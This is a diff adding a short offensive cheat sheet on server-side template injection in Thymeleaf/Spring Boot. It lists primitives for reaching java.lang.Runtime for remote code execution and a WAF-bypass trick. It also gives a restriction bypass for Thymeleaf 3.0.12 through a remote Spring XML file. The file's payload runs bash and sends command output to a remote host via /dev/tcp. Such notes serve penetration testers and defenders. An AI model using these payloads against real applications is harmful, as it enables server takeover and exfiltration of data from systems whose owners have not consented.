@@ -1,0 +1,37 @@
+* Thymeleaf/Spring Boot
+
+In Java, the goal in SSTI is to get a `java.lang.Runtime` class for RCE. We can only create classes from other base classes.
+
+Some primitives:
+
+- `T()` magic function to create class from identifier
+- `"".getClass().forName("...")` get class from string name ()
+- `T(org.postgresql.util.ObjectFactory).instantiate(<class>, "name", null, true, ...stringArgs)` instantiate class with arguments
+- `__${"org."+"apache"}__` use pre-processing to bypass WAF (thymeleaf >= 3.0)
+
+** Gadget chaining
+
+Can grep/search the jar for methods such as `.invoke`, `.getDeclaredMethod` etc
+
+** Thymeleaf v3.0.12
+
+Thymeleaf has added restrictions on what classes may be instantiated in "unsafe" contexts.
+
+One way to bypass is to get to `org.springframework.context.support.FileSystemXmlApplicationContext` and load a remote XML file which isn't restricted:
+
+@code xml
+<?xml version="1.0" encoding="UTF-8" ?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xsi:schemaLocation="http://www.springframework.org/schema/beans
+        http://www.springframework.org/schema/beans/spring-beans.xsd"
+>
+    <bean class="#{T(java.lang.Runtime).getRuntime().exec(
+        new String[] {
+            '/bin/bash', '-c', '/ls -al > /dev/tcp/ip/port'
+            }
+        )}"
+    >
+    </bean>
+</beans>
+@end
